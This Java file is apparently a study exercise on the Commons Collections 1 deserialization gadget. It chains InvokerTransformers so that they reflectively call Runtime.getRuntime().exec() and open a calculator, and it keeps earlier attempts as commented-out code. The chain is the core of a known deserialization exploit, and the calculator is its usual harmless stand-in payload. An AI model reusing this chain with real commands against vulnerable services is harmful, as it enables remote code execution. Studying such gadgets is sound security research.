package cc1.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Method;

public class InvokerTransformerTest {
    public static void main(String[] args) throws Exception {
        /*
        input = Runtime
        iMethodName = exec
        iParamTypes = String.class
        iArgs = "/usr/bin/gnome-calculator"
         */
        String cmd = "/usr/bin/gnome-calculator";
//        InvokerTransformer invokerTransformer = new InvokerTransformer(
//                "exec",
//                new Class[]{String.class},
//                new Object[]{cmd}
//        );
//        /*
//        new invokerTransformer(
//            methodName,
//            paramType,
//            param
//        ).transform(class)
//         */
//        Class c = Runtime.class;
//        Method method = c.getDeclaredMethod("getRuntime");
//        method.setAccessible(true);
//        Runtime runtime = (Runtime) method.invoke(null,null);

//        // getRuntime()
//        Method m1 = (Method) new InvokerTransformer(
//            "getDeclaredMethod",
//                new Class[]{String.class,Class[].class},
//                new Object[]{"getRuntime",null}
//        ).transform(Runtime.class);
//        m1.setAccessible(true);
//        Runtime runtime1 = (Runtime) m1.invoke(null,(Object[]) null);
//        new InvokerTransformer(
//                "exec",
//                new Class[]{String.class},
//                new Object[]{cmd}
//        ).transform(runtime1);
////        runtime1.exec(cmd);
//        // Runtime.getRuntime().exec("cmd")


//        Method exec = c.getDeclaredMethod("exec", String.class);
//        exec.setAccessible(true);

        Transformer[] transformers = new Transformer[]{
            new InvokerTransformer(
                    "getDeclaredMethod",
                    new Class[]{String.class,Class[].class},
                    new Object[]{"getRuntime",null}),
            new InvokerTransformer(
                    "invoke",
                    new Class[]{Object.class,Object[].class},
                    new Object[]{null, null}
            ),
            new InvokerTransformer(
                    "exec",
                    new Class[]{String.class},
                    new Object[]{cmd}
            )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);
//        exec.invoke(runtime, cmd);
//        invokerTransformer.transform(input);

    }
}
